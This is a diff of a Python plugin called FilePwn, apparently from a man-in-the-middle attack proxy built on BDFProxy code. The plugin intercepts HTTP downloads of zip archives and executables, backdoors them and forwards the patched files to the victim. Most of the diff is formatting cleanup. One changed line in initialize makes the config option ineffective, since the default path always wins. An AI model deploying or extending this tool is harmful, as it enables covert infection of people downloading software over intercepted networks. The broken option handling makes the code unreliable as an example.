@@ -2,7 +2,8 @@
 # 99.9999999% of this code is stolen from BDFProxy - https://github.com/secretsquirrel/BDFProxy
 #################################################################################################
 
-import sys, os
+import sys
+import os
 import pefile
 import zipfile
 import logging
@@ -17,6 +18,7 @@ try:
     from configobj import ConfigObj
 except:
     sys.exit('[-] configobj library not installed!')
+
 
 class FilePwn(Plugin):
     name = "FilePwn"
@@ -33,13 +35,10 @@ class FilePwn(Plugin):
         elif aString.lower() == 'none':
             return None
 
-    def initialize(self,options):
+    def initialize(self, options):
         '''Called if plugin is enabled, passed the options namespace'''
         self.options = options
-        self.filepwncfg = options.filepwncfg
-
-        if self.filepwncfg == None:
-            self.filepwncfg = "./config_files/filepwn.cfg"
+        self.filepwncfg = "./config_files/filepwn.cfg" or options.filepwncfg
 
         self.binaryMimeTypes = ["application/octet-stream", 'application/x-msdownload',
                                 'application/x-msdos-program', 'binary/octet-stream']
@@ -48,7 +47,7 @@ class FilePwn(Plugin):
 
         #NOT USED NOW
         #self.supportedBins = ('MZ', '7f454c46'.decode('hex'))
-        
+
         self.userConfig = ConfigObj(self.filepwncfg)
         self.FileSizeMax = self.userConfig['targets']['ALL']['FileSizeMax']
         self.WindowsIntelx86 = self.userConfig['targets']['ALL']['WindowsIntelx86']
@@ -163,7 +162,7 @@ class FilePwn(Plugin):
         except Exception as e:
             logging.warning("EXCEPTION IN binaryGrinder %s", str(e))
             return None
-    
+
     def zipGrinder(self, aZipFile):
         "When called will unpack and edit a Zip File and return a zip file"
 
@@ -262,9 +261,9 @@ class FilePwn(Plugin):
         os.remove(tmpFile)
 
         return aZipFile
-    
-    def handleResponse(self,request,data):
-        
+
+    def handleResponse(self, request, data):
+
         content_header = request.client.headers['Content-Type']
 
         if content_header in self.zipMimeTypes:
@@ -272,25 +271,25 @@ class FilePwn(Plugin):
             bd_zip = self.zipGrinder(data)
             if bd_zip:
                 logging.info("%s Patching complete, forwarding to client" % request.client.getClientIP())
-                return {'request':request,'data':bd_zip}
+                return {'request': request, 'data': bd_zip}
 
         elif content_header in self.binaryMimeTypes:
             logging.info("%s Detected supported binary type!" % request.client.getClientIP())   
             fd, tmpFile = mkstemp()
             with open(tmpFile, 'w') as f:
                 f.write(data)
-            
+
             patchb = self.binaryGrinder(tmpFile)
 
             if patchb:
                 bd_binary = open("backdoored/" + os.path.basename(tmpFile), "rb").read()
                 os.remove('./backdoored/' + os.path.basename(tmpFile))
                 logging.info("%s Patching complete, forwarding to client" % request.client.getClientIP())
-                return {'request':request,'data':bd_binary}
+                return {'request': request, 'data': bd_binary}
 
         else:
             logging.debug("%s File is not of supported Content-Type: %s" % (request.client.getClientIP(), content_header))
-            return {'request':request,'data':data}
+            return {'request': request, 'data': data}
 
     def add_options(self, options):
         options.add_argument("--filepwncfg", type=file, help="Specify a config file")
